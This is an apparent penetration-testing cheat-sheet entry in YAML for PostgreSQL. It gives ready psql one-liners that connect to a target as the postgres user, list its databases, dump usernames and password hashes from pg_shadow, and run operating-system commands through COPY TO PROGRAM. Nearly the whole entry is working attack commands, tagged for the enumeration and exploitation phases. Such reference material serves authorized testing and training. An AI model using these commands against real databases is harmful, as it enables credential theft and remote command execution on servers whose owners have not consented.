---
variants:
  - label: connect
    command: |
      psql -h $IP -p 5432 -U postgres
  - label: list-databases
    command: |
      psql -h $IP -p 5432 -U postgres -c '\l'
  - label: dump-users
    command: |
      psql -h $IP -p 5432 -U postgres -c 'SELECT usename, passwd FROM pg_shadow;'
  - label: command-exec
    command: |
      psql -h $IP -p 5432 -U postgres -c "COPY (SELECT '') TO PROGRAM 'id';"
description: Connect to PostgreSQL to enumerate databases, dump credentials, and run commands via COPY TO PROGRAM
os: [Linux]
category: [oscp, cli]
service: [PostgreSQL]
phase: [Enumeration, Exploitation]
references:
  - https://www.postgresql.org/docs/current/app-psql.html
---
